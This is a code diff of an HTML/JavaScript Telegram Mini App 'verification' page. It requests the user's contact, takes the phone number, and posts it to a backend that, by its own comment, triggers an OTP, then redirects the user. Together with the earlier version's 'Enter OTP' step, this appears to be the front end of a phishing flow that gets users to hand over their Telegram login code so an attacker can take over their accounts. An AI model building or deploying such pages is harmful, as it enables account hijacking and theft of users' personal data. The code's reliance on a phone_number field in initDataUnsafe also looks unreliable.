@@ -1,185 +1,166 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Telegram Verification</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Telegram Phone Verification</title>
+
+<!-- Telegram Mini App Script -->
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
 
 <style>
-/* --- your CSS unchanged --- */
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}
-body{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
-.container{width:100%;max-width:400px;background:#fff;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,.3);overflow:hidden}
-.header{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;padding:30px 20px;text-align:center}
-.header h1{font-size:24px;margin-bottom:10px}
-.content{padding:30px}
-.btn{width:100%;padding:16px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;margin-bottom:15px}
-.hidden{display:none}
-.phone-display{background:#f0f0f0;padding:12px;border-radius:10px;margin-bottom:15px;text-align:center;font-weight:700}
-.info-box{background:#e8f5e9;padding:15px;border-radius:12px;margin-bottom:20px;text-align:center}
-.error{background:#ffebee;color:#c62828;padding:12px;border-radius:8px;margin-bottom:15px;font-size:14px;display:none}
-.error.show{display:block}
-.loading{text-align:center;padding:40px 20px}
-.loading-spinner{width:40px;height:40px;border:3px solid #f3f3f3;border-top:3px solid #667eea;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 15px}
-@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+body{
+  font-family: system-ui;
+  background:#f5f5f5;
+  padding:20px;
+}
+.box{
+  max-width:420px;
+  margin:auto;
+  background:white;
+  border-radius:16px;
+  padding:20px;
+  box-shadow:0 10px 25px rgba(0,0,0,.12);
+}
+button{
+  width:100%;
+  padding:14px;
+  border-radius:10px;
+  border:none;
+  background:#5b6dfc;
+  color:white;
+  font-size:16px;
+}
+#phone{
+  margin-top:14px;
+  font-weight:bold;
+}
+#error{
+  margin-top:14px;
+  color:#c62828;
+}
 </style>
-
 </head>
+
+
 <body>
 
-<div class="container">
+<div class="box">
+  <h3>Telegram Account Verification</h3>
+  <p>Press the button below to share your phone number.</p>
 
-<div class="header">
-<h1>🔐 Account Verification</h1>
-<p>Verify your Telegram account</p>
-</div>
+  <button onclick="shareContact()">📞 Share Contact</button>
 
-<div class="content">
-
-<!-- Initial -->
-<div id="initial-screen">
-<div class="info-box">
-<b>Verification Steps</b><br>
-1️⃣ Click Share Contact<br>
-2️⃣ OTP sent automatically<br>
-3️⃣ Enter OTP<br>
-</div>
-
-<div id="error-message" class="error"></div>
-
-<button class="btn" onclick="shareContact()">📞 Share My Contact</button>
-</div>
-
-<!-- Contact -->
-<div id="contact-screen" class="hidden">
-<div id="phone-display" class="phone-display">Phone:</div>
-<div id="contact-error" class="error"></div>
-<div class="info-box">Sending OTP to your phone…</div>
-</div>
-
-<!-- Loading -->
-<div id="loading-screen" class="hidden">
-<div class="loading">
-<div class="loading-spinner"></div>
-<p id="loading-text">Processing…</p>
-</div>
-</div>
-
-</div>
+  <p id="phone"></p>
+  <p id="error"></p>
 </div>
 
 
 <script>
 let sessionId = null;
 
-/* Initialize WebApp */
-document.addEventListener('DOMContentLoaded', function () {
+/* --- Initialize Session with your backend --- */
+document.addEventListener("DOMContentLoaded", () => {
 
- const tg = window.Telegram?.WebApp;
- tg?.expand();
+  const tg = window.Telegram?.WebApp;
+  tg?.expand();
 
- const user = tg?.initDataUnsafe?.user || {};
+  const user = tg?.initDataUnsafe?.user || {};
 
- fetch('/init-session', {
-   method: 'POST',
-   headers: {'Content-Type': 'application/json'},
-   body: JSON.stringify({
-     user_id: user.id,
-     username: user.username,
-     first_name: user.first_name,
-     last_name: user.last_name
-   })
- })
- .then(r => r.json())
- .then(data => sessionId = data.session_id);
+  fetch("/init-session", {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({
+      user_id: user.id,
+      username: user.username,
+      first_name: user.first_name,
+      last_name: user.last_name
+    })
+  })
+  .then(r=>r.json())
+  .then(d=> sessionId = d.session_id);
 });
 
-/* -------- SHARE CONTACT -------- */
+
+/* --- Ask Telegram for contact permission --- */
 
 function shareContact(){
- const tg = window.Telegram?.WebApp;
 
- tg.requestContact((shared)=>{
+  const tg = window.Telegram?.WebApp;
 
-   if(shared){
-     getPhoneFromInitData();
-   } else {
-     showError("Contact sharing cancelled");
-   }
- });
+  if(!tg?.requestContact){
+    alert("requestContact not supported here. Use Telegram mobile app.");
+    return;
+  }
+
+  tg.requestContact((shared)=>{
+
+    console.log("Shared =", shared);
+
+    if(shared){
+      getPhone();
+    } else {
+      setError("User cancelled contact sharing");
+    }
+  });
 
 }
 
-/* -------- READ PHONE FROM TELEGRAM -------- */
 
-function getPhoneFromInitData(){
+/* --- Read phone number from initDataUnsafe --- */
 
- const tg = window.Telegram?.WebApp;
+function getPhone(){
 
- const phone = tg?.initDataUnsafe?.user?.phone_number;
+  const tg = window.Telegram?.WebApp;
 
- if(!phone){
-   showError("Phone not received from Telegram");
-   return;
- }
+  const phone = tg?.initDataUnsafe?.user?.phone_number;
 
- document.getElementById("initial-screen").classList.add("hidden");
- document.getElementById("contact-screen").classList.remove("hidden");
+  console.log("PHONE =", phone);
 
- document.getElementById("phone-display").textContent = "Phone: " + phone;
+  if(!phone){
+    setError("Phone number not received from Telegram");
+    return;
+  }
 
- sendContactToBackend(phone);
+  document.getElementById("phone").textContent =
+    "Phone: " + phone;
+
+  sendPhoneToBackend(phone);
 }
 
-/* -------- SEND TO BACKEND (OTP) -------- */
 
-function sendContactToBackend(phone){
+/* --- Send phone to backend (THIS triggers OTP) --- */
 
- showLoading("Sending OTP...");
+function sendPhoneToBackend(phone){
 
- fetch('/api/verify-contact',{
-   method:'POST',
-   headers:{'Content-Type':'application/json'},
-   body:JSON.stringify({
-     session_id:sessionId,
-     phone:phone
-   })
- })
- .then(r=>r.json())
- .then(data=>{
+  fetch("/api/verify-contact",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      session_id: sessionId,
+      phone: phone
+    })
+  })
+  .then(r=>r.json())
+  .then(data=>{
+    if(data.success){
+      window.location.href = data.redirect_url;
+    } else {
+      setError(data.error || "Failed to send OTP");
+    }
+  })
+  .catch(()=>{
+    setError("Network error");
+  });
 
-   if(data.success){
-     window.location.href=data.redirect_url;
-   } else {
-     hideLoading();
-     showError(data.error || "Failed to send OTP");
-   }
-
- })
- .catch(()=>{
-   hideLoading();
-   showError("Network error");
- });
 }
 
-/* -------- UI HELPERS -------- */
 
-function showLoading(text){
- document.getElementById("loading-text").textContent=text;
- document.getElementById("contact-screen").classList.add("hidden");
- document.getElementById("loading-screen").classList.remove("hidden");
+/* --- Helpers --- */
+
+function setError(msg){
+  document.getElementById("error").textContent = msg;
 }
-
-function hideLoading(){
- document.getElementById("loading-screen").classList.add("hidden");
-}
-
-function showError(msg){
- const el=document.getElementById("error-message");
- el.textContent=msg;
- el.classList.add("show");
-}
-
 </script>
 
 </body>
